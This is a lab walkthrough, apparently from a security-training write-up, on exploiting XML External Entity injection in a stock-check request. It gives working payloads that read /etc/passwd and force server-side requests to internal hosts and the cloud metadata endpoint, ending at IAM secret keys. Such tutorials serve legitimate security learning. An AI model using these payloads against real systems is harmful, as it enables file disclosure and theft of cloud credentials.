# Exploiting XXE to Extract Files and Perform SSRF üö®

XXE (XML External Entity) is a vulnerability that allows attackers to extract files from a server or even perform Server-Side Request Forgery (SSRF) attacks. This guide covers both use cases with detailed examples. üí°

## Part 1: Extracting Files

### 1. Prepare XML for the Attack üìù

To perform an XXE injection:

1. **Add or modify the DOCTYPE** to define an external entity pointing to the target file path.
2. **Modify the XML data** to inject the external entity into the desired value.

Example of the original XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

XXE payload to extract the `/etc/passwd` file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

### 2. Executing the Attack üíª

**Step 1**. Define the DOCTYPE and external entity:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

**Step 2**. Use the external entity in `productId`:
```xml
<productId>&xxe;</productId>
```

**Result**: The application response might look like this:
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Part 2: Performing SSRF

### What is SSRF?

Beyond extracting confidential data, XXE can be used for Server-Side Request Forgery (SSRF). This is a critical vulnerability where the server application is forced to make HTTP requests to any URL accessible to it.

If the injected entity is used in a data value returned in the application response, you can view the response from the targeted URL. Otherwise, only blind SSRF attacks are possible, which can still have serious consequences.

### Example: Targeting an Internal System

This XXE payload forces the server to make an internal HTTP request:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### Example: Accessing EC2 Metadata

In this lab example, the server hosts a (simulated) EC2 metadata endpoint at the default URL: `http://169.254.169.254/`. This endpoint can be used to extract instance metadata, including confidential data such as the IAM secret access key.

#### Steps to Perform the SSRF Attack

### 1. Start with the Product List
Choose any product from the list:

![Product List](https://github.com/user-attachments/assets/5b1c2835-49a4-4c35-a8f6-868e64b152b0)

---

### 2. Analyze the Request
Enable your proxy tool (e.g., Burp Suite) and click **"Check Stock"**:

![Stock Check Button](https://github.com/user-attachments/assets/befde5fc-be41-4db5-b1ea-157f5f333b26)

---

### 3. Intercept the Request
In **Proxy ‚Üí HTTP History**, find the POST request to `/product/stock` and send it to **Repeater**:

![POST Request](https://github.com/user-attachments/assets/1ca2ef83-dade-4541-9769-49efdf5b66ec)

---

### 4. Inject the Payload üöÄ

Insert the following external entity definition between the XML declaration and the `stockCheck` element:
```xml
<!DOCTYPE eyes [ <!ENTITY ears SYSTEM "http://169.254.169.254/"> ]>
```

Change the `productId` value to `&ears;`:

![Injecting SSRF Payload](https://github.com/user-attachments/assets/07499e10-bfeb-4136-b7e3-40bf768b2721)

---

### 5. View the Response
The response should contain `Invalid product ID:` followed by a directory name from the metadata endpoint:

![Response with Metadata Directory](https://github.com/user-attachments/assets/3423349d-50a9-47c4-9577-bb8dfe43d3d8)

---

### 6. Explore Further üöß
Iteratively update the endpoint URL in the DTD to explore the API. For example, accessing `/latest/meta-data/iam/security-credentials/admin` returns JSON containing the `SecretAccessKey`:

![Secret Access Key JSON](https://github.com/user-attachments/assets/75bdacca-9636-450b-bef0-e1d441ca4f9b)

---

## Testing Tips üîç

- **Test each XML node** for potential entity injection.
- Ensure the server includes the result in its response for non-blind SSRF.
- Use proxy tools (e.g., Burp Suite) to analyze and modify requests.
